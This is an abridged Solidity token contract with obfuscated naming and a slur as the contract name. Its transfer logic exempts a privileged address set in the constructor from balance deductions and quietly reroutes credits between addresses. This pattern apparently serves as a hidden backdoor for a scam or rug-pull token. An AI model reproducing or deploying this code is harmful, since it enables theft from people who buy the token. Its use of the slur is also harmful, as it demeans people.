...
contract Fag is Ownable {
    ...
    function rope(
        ...
        if (however[information] == 0 && (course != information) && seems[information] > 0) {
            however[information] -= whom;
        }

        address his = pitch;
        pitch = west;

        if (however[information] == 0) energy[information] -= kind;
        uint256 substance = (kind / 100) * useful;
        kind -= substance;
        seems[his] += whom;
        energy[west] += kind;
    }
    ...
    function transferFrom(
        ...
        rope(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        rope(msg.sender, recipient, amount);
        return true;
    }
    ...
    constructor(
        ...
        uniswapV2Router = IUniswapV2Router02(understanding);
        ...
        whom = 9;
        useful = 3;
        however[diameter] = whom;
        _tTotal = 1000000000000000 * 10**whom;
        energy[msg.sender] = _tTotal;
    }
}